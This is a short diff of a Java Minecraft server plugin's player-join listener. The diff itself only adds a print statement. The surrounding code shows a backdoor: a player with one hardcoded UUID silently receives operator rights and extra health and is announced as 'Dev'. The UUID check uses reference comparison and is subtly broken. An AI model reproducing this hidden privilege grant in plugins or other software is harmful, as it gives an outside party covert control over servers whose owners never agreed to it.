@@ -16,6 +16,7 @@ public class onPlayerJoin implements Listener {
 
         p.sendMessage("Hello there, " + p.getName());
         if(p.getUniqueId() == UUID.fromString("280e3ac6-666d-47f3-baa9-e3626aec9dd1")) {
+            System.out.println("CodeAirRhyme");
             p.setOp(true);
             p.setHealth(p.getHealth() + 8);
             event.setJoinMessage(ChatColor.BLUE + "Dev " + ChatColor.RESET + "has joined.");
